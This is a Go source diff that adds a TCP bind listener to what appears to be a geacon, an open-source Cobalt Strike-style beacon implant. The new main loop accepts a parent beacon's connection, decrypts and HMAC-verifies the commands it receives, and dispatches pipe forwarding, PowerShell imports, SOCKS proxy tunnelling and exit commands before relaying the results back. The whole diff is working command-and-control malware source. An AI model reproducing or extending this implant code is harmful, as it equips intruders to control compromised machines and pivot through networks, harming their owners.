@@ -11,25 +11,88 @@ import (
 	"os"
 	"strings"
 	"time"
+	"net"
 )
 
 func main() {
 
-	ok := packet.FirstBlood()
-	if ok {
+	l, err := net.Listen("tcp", config.C2)
+    if err != nil {
+        fmt.Println("Error listening:", err.Error())
+        os.Exit(1)
+    } else {
+		fmt.Println("Listening on %s", config.C2)
+	}
+    // Close the listener when the application closes
+    defer l.Close()
+	packet.InitialMetaInfo()
+	// packet.encryptedMetaInfo = packet.EncryptedMetaInfo()
+    for {
+        // Listen for a single incoming connection at a time
+        conn, err := l.Accept()
+        if err != nil {
+            fmt.Println("Error accepting: ", err.Error())
+        } else {
+			fmt.Println("Connection accepted: %s", conn)
+		}
+		packet.FirstBlood(conn)
+		// Handle requests of the single connection we are listening for
 		for {
+			// handle linked beacons, same as with HTTP(S) geacons
 			resultBuf := make([]byte, 0, 100000) // holds all beacon output, should be the maximum length of a HTTP body
-			chainedResults := packet.CheckTcpBeacons()
-			fmt.Printf("\n\nLENGTH OF RESULTS IS: %d\n\n", len(resultBuf))
-			resp := packet.PullCommand()
-			fmt.Printf("%x\n", resp.Bytes())
-			fmt.Printf("%d \n", resp.Response().ContentLength)
-			if resp != nil {
-				totalLen := len(resp.Bytes())
-				if totalLen > 0 {
-					
+			// handle requests from our parent beacon
+			// first read 4 bytes, if the are 0x00000000, then we have nothing to do and answer with 0x000000, otherwise handle the request
+			fmt.Printf("Attempting read\n")
+			bufLenRaw := make([]byte, 4)
+			_, err := conn.Read(bufLenRaw)
+			if err != nil {
+				fmt.Println("Error reading command length bytes: ", err.Error())
+			}
+			bufLen := packet.ReadLittleInt(bufLenRaw)
+			fmt.Printf("Command length to expect: %d\n", bufLen)
+			if bufLen == 0 {
+				fmt.Printf("bufLen is equal to zero\nStill checking connected beacons")
 
-					decrypted, hmacVerfied := packet.DecryptPacket(resp.Bytes())
+				chainedResults := packet.CheckTcpBeacons()
+				fmt.Printf("\n\nLENGTH OF RESULTS IS: %d\n\n", len(resultBuf))
+
+				socksResults := packet.CheckSocksOutput()
+				chainedResults = append(chainedResults, socksResults...)
+				fmt.Printf("\n\nLENGTH OF RESULTS IS: %d\n\n", len(resultBuf))
+				if len(chainedResults) > 0 {
+					fmt.Printf("chainedResults has length %d", len(chainedResults))
+					resultBuf = append(resultBuf, chainedResults...)
+					packet.PushResultTcp(conn, resultBuf)
+				} else {
+					fmt.Printf("Sending 4 bytes of zeros, nothing to do\n")
+					conn.Write([]byte{00, 00, 00, 00})
+					fmt.Printf("Beacon checked in!\n\n")
+				}
+			} else {
+				fmt.Printf("bufLen is larger than zero, reading command buffer\n")
+				buf := make([]byte, bufLen)
+				// Read the incoming connection into the buffer.
+				reqLen, err := conn.Read(buf)
+				if err != nil {
+					fmt.Println("Error reading:", err.Error())
+					continue
+				}
+				if reqLen <= 0 {
+					continue
+				}
+				fmt.Printf("READ %d BYTES\n", reqLen)
+
+				chainedResults := packet.CheckTcpBeacons()
+				fmt.Printf("\n\nLENGTH OF RESULTS IS: %d\n\n", len(resultBuf))
+
+				socksResults := packet.CheckSocksOutput()
+				chainedResults = append(chainedResults, socksResults...)
+				fmt.Printf("\n\nLENGTH OF RESULTS IS: %d\n\n", len(resultBuf))
+
+				buf = buf[:reqLen]
+				if len(buf) > 0 {
+					
+					decrypted, hmacVerfied := packet.DecryptPacket(buf)
 
 					if decrypted != nil {
 						if hmacVerfied {
@@ -41,6 +104,7 @@ func main() {
 
 							decryptedBuf := bytes.NewBuffer(decrypted[8:])
 							for {
+								fmt.Printf("packetLen: %d\n", packetLen)
 								if packetLen <= 0 {
 									break
 								}
@@ -168,10 +232,17 @@ func main() {
 									case packet.CMD_TYPE_PIPE_FWD:
 										beaconId, message := packet.ParsePipeForward(cmdBuf)
 										fmt.Printf("Forwarding commands to tcp beacon %d", beaconId)
-										packet.SendLinkPacket(beaconId, message)
+										_ = packet.SendLinkPacket(beaconId, message)
 									case packet.CMD_TYPE_PWSH_IMPORT:
 										// fmt.Printf("%x", cmdBuf)
 										packet.SetShellPreLoadedFile(cmdBuf)
+									case packet.CMD_TYPE_SOCKS_FWD:
+										finalPacket := packet.ParseSocksInitTraffic(cmdBuf)
+										resultBuf = append(resultBuf, finalPacket...)
+									case packet.CMD_TYPE_SOCKS_SEND:
+										packet.ParseSocksTraffic(cmdBuf)
+									case packet.CMD_TYPE_SOCKS_DIE:
+										packet.ParseSocksDie(cmdBuf)
 									case packet.CMD_TYPE_EXIT:
 										os.Exit(0)
 									default:
@@ -187,37 +258,45 @@ func main() {
 
 									}
 								} else {
-									fmt.Printf("cmdBuf is empty!")
+									fmt.Printf("cmdBuf is empty!\n")
 								}
 							}
+							fmt.Printf("DEBUG 1\n")
 							if len(resultBuf) > 0 {
+								fmt.Printf("DEBUG 2\n")
 								resultBuf = append(resultBuf, chainedResults...)
 								// send a consolidated output
-								packet.PushResult(packet.EncryptPacket(resultBuf))
-
 								fmt.Printf("\n\nLENGTH OF RESULTS IS: %d\n\n", len(resultBuf))
 
 								fmt.Printf("Sending the following data:\n%x\n\n", resultBuf)
 
-								packet.PushResult(packet.EncryptPacket(resultBuf))
+								packet.PushResultTcp(conn, resultBuf)
+							} else {
+								fmt.Printf("resultBuf is empty\n")
+								fmt.Printf("Sending 4 bytes of zeros, nothing to do\n")
+								conn.Write([]byte{00, 00, 00, 00})
 							}
 						} else {
 							fmt.Printf("HMAC could not be verified. Ignoring command.\n\n")
 						}
 					} else {
 						if len(chainedResults) > 0 {
+							fmt.Printf("chainedResults has length %d", len(chainedResults))
 							resultBuf = append(resultBuf, chainedResults...)
-							packet.PushResult(packet.EncryptPacket(resultBuf))
-
+							packet.PushResultTcp(conn, resultBuf)
 						} else {
+							fmt.Printf("Sending 4 bytes of zeros, nothing to do\n")
+							conn.Write([]byte{00, 00, 00, 00})
 							fmt.Printf("Beacon checked in!\n\n")
 						}
 					}
 				}
 			}
-			// fmt.Printf("Cycle done, sleeping for %d seconds!\n\n\n", (config.WaitTime / time.Millisecond / 1000))
-			time.Sleep(config.WaitTime)
+			fmt.Printf("here we go again \n\n")
+			// fmt.Printf("Sleeping...\n\n")
+
+			// time.Sleep(config.WaitTime)
 		}
-	}
+    }
 
 }
